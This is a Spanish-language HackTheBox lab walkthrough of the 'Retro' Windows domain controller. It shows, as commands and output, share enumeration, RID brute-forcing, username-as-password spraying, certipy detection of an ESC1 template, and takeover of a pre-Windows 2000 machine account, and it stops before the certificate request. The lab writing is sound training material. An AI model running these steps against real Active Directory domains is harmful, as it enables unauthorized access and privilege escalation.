Propiedades:
- OS: Windows
- Plataforma: HackTheBox
- Nivel: Easy
- Tags: #esc1 #certipy #bloodhound #rusthound #rid-brute #PRE-WINDOWS-2000-COMAPTIBLE-ACCESS    

![](assets/Pasted%20image%2020260211213428.png)
 
## Reconocimiento

Comienzo con un ping para comprobar la conectividad.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/retro]
└─$ ping -c 1 10.129.234.44
PING 10.129.234.44 (10.129.234.44) 56(84) bytes of data.
64 bytes from 10.129.234.44: icmp_seq=1 ttl=127 time=85.8 ms

--- 10.129.234.44 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 85.828/85.828/85.828/0.000 ms
```

Tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/retro]
└─$ sudo nmap 10.129.234.44 -p- -Pn -n -sS --min-rate 5000 -vvv -oG nmap/target

Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
3389/tcp  open  ms-wbt-server    syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49669/tcp open  unknown          syn-ack ttl 127
49670/tcp open  unknown          syn-ack ttl 127
51466/tcp open  unknown          syn-ack ttl 127
51479/tcp open  unknown          syn-ack ttl 127
53647/tcp open  unknown          syn-ack ttl 127
53655/tcp open  unknown          syn-ack ttl 127
```

Sobre los puertos abiertos tiro un segundo escaneo mas profundo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/retro]
└─$ sudo nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,9389,49664,49667,49669,49670,51466,51479,53647,53655 -sV -sC -Pn -n -sS -vvv 10.129.234.44 -oN nmap/target

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-02-07 00:27:31Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: 2026-02-07T00:29:02+00:00; +11s from scanner time.
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Issuer: commonName=retro-DC-CA/domainComponent=retro
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-10-02T10:33:09
| Not valid after:  2025-10-02T10:33:09
| MD5:   0570:85e4:2e0b:442c:16c0:d258:3acb:1019
| SHA-1: 0b6c:b037:2581:5555:b186:8ca2:35e7:21db:2c8d:56d6
| -----BEGIN CERTIFICATE-----
| MIIHDjCCBPagAwIBAgITJgAAAAfu81FFx2Gm5gAAAAAABzANBgkqhkiG9w0BAQsF
| ADBBMRIwEAYKCZImiZPyLGQBGRYCdmwxFTATBgoJkiaJk/IsZAEZFgVyZXRybzEU
| MBIGA1UEAxMLcmV0cm8tREMtQ0EwHhcNMjQxMDAyMTAzMzA5WhcNMjUxMDAyMTAz
| MzA5WjAWMRQwEgYDVQQDEwtEQy5yZXRyby52bDCCASIwDQYJKoZIhvcNAQEBBQAD
| ggEPADCCAQoCggEBAKQgOozob26wVFG9KB4eARJjNsNP1XseWS0yc6P1Ukd/oWY7
| <MAS..>
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Issuer: commonName=retro-DC-CA/domainComponent=retro
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-10-02T10:33:09
| Not valid after:  2025-10-02T10:33:09
| MD5:   0570:85e4:2e0b:442c:16c0:d258:3acb:1019
| SHA-1: 0b6c:b037:2581:5555:b186:8ca2:35e7:21db:2c8d:56d6
| -----BEGIN CERTIFICATE-----
| MIIHDjCCBPagAwIBAgITJgAAAAfu81FFx2Gm5gAAAAAABzANBgkqhkiG9w0BAQsF
| ADBBMRIwEAYKCZImiZPyLGQBGRYCdmwxFTATBgoJkiaJk/IsZAEZFgVyZXRybzEU
| MBIGA1UEAxMLcmV0cm8tREMtQ0EwHhcNMjQxMDAyMTAzMzA5WhcNMjUxMDAyMTAz
| MzA5WjAWMRQwEgYDVQQDEwtEQy5yZXRyby52bDCCASIwDQYJKoZIhvcNAQEBBQAD
| ggEPADCCAQoCggEBAKQgOozob26wVFG9KB4eARJjNsNP1XseWS0yc6P1Ukd/oWY7
| <MAS..>
|_ssl-date: 2026-02-07T00:29:02+00:00; +11s from scanner time.
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Issuer: commonName=retro-DC-CA/domainComponent=retro
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-10-02T10:33:09
| Not valid after:  2025-10-02T10:33:09
| MD5:   0570:85e4:2e0b:442c:16c0:d258:3acb:1019
| SHA-1: 0b6c:b037:2581:5555:b186:8ca2:35e7:21db:2c8d:56d6
| -----BEGIN CERTIFICATE-----
| MIIHDjCCBPagAwIBAgITJgAAAAfu81FFx2Gm5gAAAAAABzANBgkqhkiG9w0BAQsF
| ADBBMRIwEAYKCZImiZPyLGQBGRYCdmwxFTATBgoJkiaJk/IsZAEZFgVyZXRybzEU
| MBIGA1UEAxMLcmV0cm8tREMtQ0EwHhcNMjQxMDAyMTAzMzA5WhcNMjUxMDAyMTAz
| MzA5WjAWMRQwEgYDVQQDEwtEQy5yZXRyby52bDCCASIwDQYJKoZIhvcNAQEBBQAD
| ggEPADCCAQoCggEBAKQgOozob26wVFG9KB4eARJjNsNP1XseWS0yc6P1Ukd/oWY7
| rAaiie6nocDLzf733wGlHm51lSLASLn+PyvnWF74oAVUp8e8ifWM4P9gu9dgTyB3
| OV9B0VpWNgiG2xzj4mcFaQchRie/BTqQnLcu+E6oyjY/tXe1JYl+oqR5fcc2Sl0q
| kko2zgT5MDQdiL1wmXthsJnPs60qtNyh1B5BrH0AcIyZdA/Fy+2mu2IEjPy/Blk6
| p5JOqxdi2UI8d4dzqkiMYz/TRJnHOU7dc960TfQy31m07jfFEftHlgG5qAR508R9
| cjjWPLQQhb7AGMQygxuqSY86YtWVtiPxb/36/cECAwEAAaOCAygwggMkMC8GCSsG
| AQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAdBgNV
| HSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgGCSqG
| <MAS..>
|_ssl-date: 2026-02-07T00:29:02+00:00; +11s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Issuer: commonName=retro-DC-CA/domainComponent=retro
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-10-02T10:33:09
| Not valid after:  2025-10-02T10:33:09
| MD5:   0570:85e4:2e0b:442c:16c0:d258:3acb:1019
| SHA-1: 0b6c:b037:2581:5555:b186:8ca2:35e7:21db:2c8d:56d6
| -----BEGIN CERTIFICATE-----
| MIIHDjCCBPagAwIBAgITJgAAAAfu81FFx2Gm5gAAAAAABzANBgkqhkiG9w0BAQsF
| ADBBMRIwEAYKCZImiZPyLGQBGRYCdmwxFTATBgoJkiaJk/IsZAEZFgVyZXRybzEU
| MBIGA1UEAxMLcmV0cm8tREMtQ0EwHhcNMjQxMDAyMTAzMzA5WhcNMjUxMDAyMTAz
| MzA5WjAWMRQwEgYDVQQDEwtEQy5yZXRyby52bDCCASIwDQYJKoZIhvcNAQEBBQAD
| ggEPADCCAQoCggEBAKQgOozob26wVFG9KB4eARJjNsNP1XseWS0yc6P1Ukd/oWY7
| <MAS..>
|_ssl-date: 2026-02-07T00:29:02+00:00; +11s from scanner time.
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
|_ssl-date: 2026-02-07T00:29:02+00:00; +11s from scanner time.
| rdp-ntlm-info:
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-07T00:28:23+00:00
| ssl-cert: Subject: commonName=DC.retro.vl
| Issuer: commonName=DC.retro.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-06T00:22:40
| Not valid after:  2026-08-08T00:22:40
| MD5:   0734:ebb1:ae78:d0ad:4ae9:8441:71f1:6552
| SHA-1: f292:6c13:d18a:8e66:5907:29db:a435:3e50:a86e:6be6
| -----BEGIN CERTIFICATE-----
| MIIC2jCCAcKgAwIBAgIQKVrAFZTS15FEWrdPnzPXDzANBgkqhkiG9w0BAQsFADAW
| MRQwEgYDVQQDEwtEQy5yZXRyby52bDAeFw0yNjAyMDYwMDIyNDBaFw0yNjA4MDgw
| <MAS.>
|_-----END CERTIFICATE-----
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
51466/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
51479/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
53647/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
53655/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 36202/tcp): CLEAN (Timeout)
|   Check 2 (port 37918/tcp): CLEAN (Timeout)
|   Check 3 (port 52836/udp): CLEAN (Timeout)
|   Check 4 (port 4433/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 10s, deviation: 0s, median: 10s
| smb2-time:
|   date: 2026-02-07T00:28:23
|_  start_date: N/A
```

Por la información que tengo puedo intuir que estoy contra un `DC`.

- Puerto 88 Kerberos
- Puerto 135 RPC
- Puerto 139, 445 SMB
- Puerto 389, 636 LDAP
- Puerto 3389 RDP
## Enumeración

### Puerto 445 SMB.

Saque información general de la maquina:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/retro]
└─$ nxc smb 10.129.234.44
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
```

- Dominio **retro.vl** y nombre **DC**.

Puedo enumerar los shares como guest:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/retro]
└─$ nxc smb retro.vl -u 'guest' -p '' --shares
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.44   445    DC               [+] retro.vl\guest:
SMB         10.129.234.44   445    DC               [*] Enumerated shares
SMB         10.129.234.44   445    DC               Share           Permissions     Remark
SMB         10.129.234.44   445    DC               -----           -----------     ------
SMB         10.129.234.44   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.44   445    DC               C$                              Default share
SMB         10.129.234.44   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.44   445    DC               NETLOGON                        Logon server share
SMB         10.129.234.44   445    DC               Notes
SMB         10.129.234.44   445    DC               SYSVOL                          Logon server share
SMB         10.129.234.44   445    DC               Trainees        READ
```

- Tengo permisos de lectura sobre el share Trainees

Al conectarme al recurso solo encontré una nota:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/retro]
└─$ smbclient //10.129.234.44/Trainees -U 'guest'
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jul 23 21:58:43 2023
  ..                                DHS        0  Wed Jun 11 14:17:10 2025
  Important.txt                       A      288  Sun Jul 23 22:00:13 2023

                4659711 blocks of size 4096. 1308253 blocks available
smb: \> get Important.txt
getting file \Important.txt of size 288 as Important.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
smb: \>
```

La nota decía que habían juntado todas las cuentas de los "Trainee" en una sola.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/retro]
└─$ cat Important.txt
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins
```

Al enumerar usuarios vía rid bruteforce me encontré con los siguientes:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/retro]
└─$ nxc smb retro.vl -u 'guest' -p '' --rid-brute | grep "SidTypeUser"
SMB                      10.129.234.44   445    DC               500: RETRO\Administrator (SidTypeUser)
SMB                      10.129.234.44   445    DC               501: RETRO\Guest (SidTypeUser)
SMB                      10.129.234.44   445    DC               502: RETRO\krbtgt (SidTypeUser)
SMB                      10.129.234.44   445    DC               1000: RETRO\DC$ (SidTypeUser)
SMB                      10.129.234.44   445    DC               1104: RETRO\trainee (SidTypeUser)
SMB                      10.129.234.44   445    DC               1106: RETRO\BANKING$ (SidTypeUser)
SMB                      10.129.234.44   445    DC               1107: RETRO\jburley (SidTypeUser)
SMB                      10.129.234.44   445    DC               1109: RETRO\tblack (SidTypeUser)
```

- La cuenta trainee es la cuenta de la que hablaban en la nota.

## Acceso Inicial

Puedo probar los usuarios como usuario / contraseña.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/retro]
└─$ nxc smb retro.vl -u users.txt -p users.txt --no-bruteforce --continue-on-success

SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.44   445    DC               [-] retro.vl\Administrator:Administrator STATUS_LOGON_FAILURE
SMB         10.129.234.44   445    DC               [-] retro.vl\Guest:Guest STATUS_LOGON_FAILURE
SMB         10.129.234.44   445    DC               [-] retro.vl\krbtgt:krbtgt STATUS_LOGON_FAILURE
SMB         10.129.234.44   445    DC               [-] retro.vl\DC$:DC$ STATUS_LOGON_FAILURE
SMB         10.129.234.44   445    DC               [+] retro.vl\trainee:trainee
SMB         10.129.234.44   445    DC               [-] retro.vl\BANKING$:BANKING$ STATUS_LOGON_FAILURE
SMB         10.129.234.44   445    DC               [-] retro.vl\jburley:jburley STATUS_LOGON_FAILURE
SMB         10.129.234.44   445    DC               [-] retro.vl\tblack:tblack STATUS_LOGON_FAILURE
```

- El [+] en trainee indica que la cuenta es valida.

Ahora que tengo credenciales puedo volver a enumerar los shares a los que tengo acceso:

```bash

┌──(wndr㉿wndr)-[~/Machines/hackthebox/retro]
└─$ nxc smb retro.vl -u trainee -p trainee --shares
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.44   445    DC               [+] retro.vl\trainee:trainee
SMB         10.129.234.44   445    DC               [*] Enumerated shares
SMB         10.129.234.44   445    DC               Share           Permissions     Remark                                                                     
SMB         10.129.234.44   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.44   445    DC               C$                              Default share
SMB         10.129.234.44   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.44   445    DC               NETLOGON        READ            Logon server share
SMB         10.129.234.44   445    DC               Notes           READ
SMB         10.129.234.44   445    DC               SYSVOL          READ            Logon server share
SMB         10.129.234.44   445    DC               Trainees        READ
```

- Tengo acceso de lectura a un nuevo recurso llamado Notes.

Al conectarme al recurso me encontré con 2 archivos, uno llamado user.txt y otro ToDo.txt.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/retro]
└─$ smbclient //10.129.234.44/Notes -U 'trainee%trainee'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Apr  9 03:12:49 2025
  ..                                DHS        0  Wed Jun 11 14:17:10 2025
  ToDo.txt                            A      248  Sun Jul 23 22:05:56 2023
  user.txt                            A       32  Wed Apr  9 03:13:01 2025

                4659711 blocks of size 4096. 1325582 blocks available
smb: \> get ToDo.txt
getting file \ToDo.txt of size 248 as ToDo.txt (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
smb: \> get user.txt
getting file \user.txt of size 32 as user.txt (0.1 KiloBytes/sec) (average 0.3 KiloBytes/sec)
```

user.txt es la flag y ToDo.txt menciona una cuenta maquina bastante vieja: 

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/retro/content]
└─$ \cat ToDo.txt
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James

┌──(wndr㉿wndr)-[~/Machines/hackthebox/retro/content]
└─$ \cat user.txt
cbda362cff2099072c5e96c51712ff33
```

Otra cosa que tengo que puedo hacer ahora que tengo credenciales es utilizar `bloodhound`.

- **BloodHound** es una herramienta de **enumeración y análisis de Active Directory** que usa **grafos** para identificar **relaciones de confianza, permisos y rutas de escalada de privilegios** entre usuarios, grupos y equipos dentro de un dominio.

Primero tenemos que utilizar un **Ingestor** para recopilar la info del domino, en mi caso utilice [rusthound-ce](https://github.com/g0h4n/RustHound-CE). 

```bash
┌──(wndr㉿wndr)-[~/Tools/RustHound-CE]
└─$ ./rusthound-ce -d retro.vl -u trainee@retro.vl -z
---------------------------------------------------
Initializing RustHound-CE at 00:49:51 on 02/07/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-02-07T00:49:51Z INFO  rusthound_ce] Verbosity level: Info
[2026-02-07T00:49:51Z INFO  rusthound_ce] Collection method: All
Password:
[2026-02-07T00:49:53Z INFO  rusthound_ce::ldap] Connected to RETRO.VL Active Directory!
[2026-02-07T00:49:53Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-02-07T00:49:53Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-02-07T00:49:55Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=retro,DC=vl
[2026-02-07T00:49:55Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-02-07T00:49:56Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=retro,DC=vl
[2026-02-07T00:49:56Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-02-07T00:49:57Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=retro,DC=vl
[2026-02-07T00:49:57Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-02-07T00:49:57Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=retro,DC=vl
[2026-02-07T00:49:57Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-02-07T00:49:57Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=retro,DC=vl
[2026-02-07T00:49:57Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
⢀ Parsing LDAP objects: 5%                                                                                                                                                                                          [2026-02-07T00:49:58Z INFO  rusthound_ce::objects::enterpriseca] Found 12 enabled certificate templates
[2026-02-07T00:49:58Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-02-07T00:49:58Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-02-07T00:49:58Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-02-07T00:49:58Z INFO  rusthound_ce::json::maker::common] 7 users parsed!
[2026-02-07T00:49:58Z INFO  rusthound_ce::json::maker::common] 61 groups parsed!
[2026-02-07T00:49:58Z INFO  rusthound_ce::json::maker::common] 2 computers parsed!
[2026-02-07T00:49:58Z INFO  rusthound_ce::json::maker::common] 1 ous parsed!
[2026-02-07T00:49:58Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-02-07T00:49:58Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-02-07T00:49:58Z INFO  rusthound_ce::json::maker::common] 74 containers parsed!
[2026-02-07T00:49:58Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
[2026-02-07T00:49:58Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!
[2026-02-07T00:49:58Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!
[2026-02-07T00:49:58Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
[2026-02-07T00:49:58Z INFO  rusthound_ce::json::maker::common] 34 certtemplates parsed!
[2026-02-07T00:49:58Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
[2026-02-07T00:49:58Z INFO  rusthound_ce::json::maker::common] .//20260207004958_retro-vl_rusthound-ce.zip created!
```


## Escalada de Privilegios.

Antes de pasar a bloodhound puedo utilizar `certipy` para ver posibles certificados vulnerables:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/retro]
└─$ certipy find -u trainee@retro.vl -p trainee -dc-ip 10.129.234.44 -stdout -vulnerable
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'retro-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'retro-DC-CA'
[*] Checking web enrollment for CA 'retro-DC-CA' @ 'DC.retro.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : retro-DC-CA
    DNS Name                            : DC.retro.vl
    Certificate Subject                 : CN=retro-DC-CA, DC=retro, DC=vl
    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85
    Certificate Validity Start          : 2023-07-23 21:03:51+00:00
    Certificate Validity End            : 2028-07-23 21:13:50+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : RETRO.VL\Administrators
      Access Rights
        ManageCa                        : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        ManageCertificates              : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Enroll                          : RETRO.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : RetroClients
    Display Name                        : Retro Clients
    Certificate Authorities             : retro-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2023-07-23T21:17:47+00:00
    Template Last Modified              : 2023-07-23T21:18:39+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : RETRO.VL\Administrator
        Full Control Principals         : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Owner Principals          : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Dacl Principals           : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Property Enroll           : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
    [+] User Enrollable Principals      : RETRO.VL\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

- El certificado RetroClients es vulnerable a ESC1.

El problema es que solo las cuentas maquinas pueden solicitar el certificado vulnerable por lo cual necesito tener acceso a alguna cuenta.

Con `netexec` y el modulo maq puedo ver si puedo agregar alguna cuenta maquina al dominio:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/retro]
└─$ nxc ldap retro.vl -u trainee -p trainee -M maq
LDAP        10.129.234.44   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:retro.vl)
LDAP        10.129.234.44   389    DC               [+] retro.vl\trainee:trainee
MAQ         10.129.234.44   389    DC               [*] Getting the MachineAccountQuota
MAQ         10.129.234.44   389    DC               MachineAccountQuota: 0
```

- MachineAccountQuota en 0 me indica que no puedo agregar ninguna cuenta maquina.

Podemos devolvernos a la nota `ToDo.txt` que nos indicaba que existía una maquina muy vieja, esta cuenta la podemos visualizar desde bloodhound y ver que pertenece al grupo `PRE-WINDOWS 2000 COMAPTIBLE ACCESS`.

![](assets/Pasted%20image%2020260206191450.png)

Las cuentas con PRE-WINDOWS 2000 COMPATIBLEE ACCESS, suelen tener su nombre de usuario en minúsculas como contraseña, esto lo podemos comprobar con `netxec`: 

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/retro/content]
└─$ nxc smb retro.vl -u BANKING$ -p banking
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.44   445    DC               [-] retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

- STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT indica que la contraseña es valida pero que necesitamos cambiarla para poder usar la cuenta

Con `impacket-changepasswd` voy a cambiar la contraseña: 

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/retro/content]
└─$ impacket-changepasswd -newpass w0nder11ng 'retro.vl/BANKING$:banking@dc.retro.vl' -protocol rpc-samr
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Changing the password of retro.vl\BANKING$
[*] Connecting to DCE/RPC as retro.vl\BANKING$
[*] Password was changed successfully.
```

Ahora puedo probar las nuevas credenciales:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/retro/content]
└─$ nxc smb retro.vl -u BANKING$ -p w0nder11ng
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.44   445    DC               [+] retro.vl\BANKING$:w0nder11ng
```

- El [+] indica que las credenciales son validas y ahora puedo solicitar el certificado vulnerable a ESC1.

[CertipyPrivEscWiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation) define ESC1 como lo siguiente:

!!! quote
    ESC1 is the stereotypical AD CS misconfiguration that can lead directly to privilege escalation. The vulnerability arises when a certificate template is inadequately secured, permitting a low-privileged user to request a certificate and, importantly, specify an arbitrary identity within the certificate's SAN. This allows the attacker to impersonate any user, including administrators.

Básicamente ESC1 me permite suplantar usuarios indicándolo en el SAN del certificado vulnerable.

Primero tengo que sacar el SID del usuario administrator:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/retro/content]
└─$ bloodyAD --host dc.retro.vl -d retro.vl -u trainee -p trainee get object administrator

objectSid: S-1-5-21-2983547755-698260136-4283918172-500
```

Lo siguiente consiste en solicitar el certificado vulnerable para suplantar al usuario administrador:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/retro/content]
